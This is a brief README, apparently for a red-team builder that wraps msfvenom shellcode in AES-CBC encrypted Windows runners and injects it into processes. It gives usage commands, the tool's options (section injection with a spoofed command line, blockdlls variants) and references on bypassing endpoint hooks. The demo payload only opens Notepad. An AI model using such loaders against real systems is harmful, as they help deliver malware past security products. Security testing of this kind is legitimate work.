

Dependencies:
```
gcc
python3
nasm
```

use like
```bash
python3 -m venv env  
source env/bin/activate  
pip install pycryptodome  
msfvenom -p windows/x64/exec CMD='C:\Windows\System32\notepad.exe' EXITFUNC=process -f raw -o test.bin  
python build.py -inbin test.bin -execmethod runner
python builder.py -inbin test.bin -execmethod section_inject --process notepad.exe --cmdline 'c:\\windows\\system32\\firefox.exe'
```


```bash
usage: builder.py [-h] [-inbin INBIN] [-execmethod {section_inject,section_runner,section_runner_dll,section_runner_big,section_runner_big_dll,runner,runner_dll,runner_big_blockddls,runner_big_blockddls_dll,runner_blockdlls,runner_blockdlls_dll}] [--process PROCESS] [--cmdline CMDLINE] [--verbose]

generate AES-CBC encrypted shellcode runners

optional arguments:
  -h, --help            show this help message and exit
  -inbin INBIN          .bin file
  -execmethod {section_inject,section_runner,section_runner_dll,section_runner_big,section_runner_big_dll,runner,runner_dll,runner_big_blockddls,runner_big_blockddls_dll,runner_blockdlls,runner_blockdlls_dll}
  --process PROCESS     process to inject (only with 'section_inject')
  --cmdline CMDLINE     cmdline argument to show (only with 'section_inject')
  --verbose             
  ```  

### References & Reading
Generally:  
hasherezade -- rely heavilly on her PEB lookup heeader code
forrest-orr -- excellent code to read and learn from  
batsec -- lots of python building stuff from his shad0w project  

https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams  
https://github.com/simon-whitehead/assembly-fun/blob/master/windows-x64/README.md  
